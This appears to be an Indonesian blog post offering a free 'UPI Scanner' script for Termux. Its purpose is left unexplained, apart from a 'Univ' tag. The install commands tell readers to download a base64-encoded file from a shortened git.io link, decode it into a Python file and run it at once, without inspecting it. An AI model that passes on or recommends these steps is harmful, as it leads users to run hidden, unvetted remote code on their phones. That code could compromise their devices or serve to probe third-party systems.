---
layout: post
title: "Script UPI Scanner Gratis"
tags: [Script, Termux, Univ]
comment: false
---

<img alt="Upi scanner gratis" border="0" src="https://1.bp.blogspot.com/-f1O4Hl2H2_Y/YD9bKxatikI/AAAAAAAAAKs/02e-BBP9lhEvK15HAlbs0ar751i1d0YGQCLcBGAsYHQ/s0/ss-upi.jpg"/>

<p>Hai abang2 jago? apa kabar? kali ini gua mau share <strong>Script UPI Scanner</strong> secara gratis. Kenapa script nya kukasih gratis? ya karna script2 kayak gini udah ampas banget dan siapa juga yg mau beli. Daripada nanti membusuk di hp gua mending gua bagi2in.</p>
<p>Untuk instalasi nya kalian tinggal salin command2 dibawah dan pastekan ke termux kalian masing2, kalo ada error atau gagal silahkan komentar dibawah. Command dibawah itu disalin ya jangan ditulis ulang takutnya mata lu rabun trus salah ketik.</p>
<h1>Command list</h1>
<pre><code>$ pkg install wget python
$ pip install requests bs4
$ mkdir -p "XUPI" && cd $_
$ wget https://git.io/JqeK7
$ cat JqeK7 | base64 -d > upi.py
$ python upi.py
</code></pre>
<p>Perhatian untuk semuanya, kalo mau komentar mending login dulu biar kalo gua bls komentar lu nanti ada notif ke email lu. Dan kayaknya bukan ini aja script gratisnya, nanti gua share lagi jadi pantengin terus blog gua.</p>
<p>Jangan lupa kalo ada bug,error atau kesulitan silahkan report di komentar, atau request tool juga boleh asal jangan request tool yg aneh2.</p>
